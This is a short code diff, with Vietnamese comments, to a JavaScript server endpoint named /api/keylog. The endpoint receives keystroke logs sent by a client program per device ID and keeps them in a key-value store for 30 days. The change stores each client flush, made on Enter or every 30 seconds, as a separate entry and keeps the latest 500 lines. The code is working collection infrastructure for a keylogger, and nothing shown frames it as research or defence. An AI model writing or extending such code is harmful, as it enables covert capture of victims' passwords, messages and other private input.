@@ -316,6 +316,7 @@ export default {
 
     // ── POST /api/keylog ───────────────────────────────────────────────────
     // Source LQ_OBJ gửi log bàn phím lên theo device ID
+    // Mỗi request là 1 dòng độc lập (client đã flush theo từng lần gõ Enter / timer 30s)
     if (url.pathname === '/api/keylog' && request.method === 'POST') {
       let body;
       try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
@@ -327,20 +328,10 @@ export default {
       let record = raw ? JSON.parse(raw) : { deviceID, authKey: key || '', lines: [] };
 
       const now = new Date();
-      const nowMs = now.getTime();
-      const lastLine = record.lines.length > 0 ? record.lines[record.lines.length - 1] : null;
-      const THREE_MINUTES = 3 * 60 * 1000;
-
-      if (lastLine && (nowMs - new Date(lastLine.ts).getTime()) < THREE_MINUTES) {
-        // Trong vòng 3 phút → append vào dòng hiện tại, ngăn cách bằng |
-        lastLine.text = lastLine.text + ' | ' + line;
-        lastLine.ts = now.toISOString();
-      } else {
-        // Quá 3 phút hoặc dòng đầu tiên → tạo dòng mới
-        record.lines.push({ text: line, ts: now.toISOString() });
-        // Giữ tối đa 200 dòng
-        if (record.lines.length > 200) record.lines = record.lines.slice(-200);
-      }
+      // Mỗi flush từ client là 1 entry riêng biệt (không gộp nữa)
+      record.lines.push({ text: line.trim(), ts: now.toISOString() });
+      // Giữ tối đa 500 dòng gần nhất
+      if (record.lines.length > 500) record.lines = record.lines.slice(-500);
 
       record.authKey = key || record.authKey;
       await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
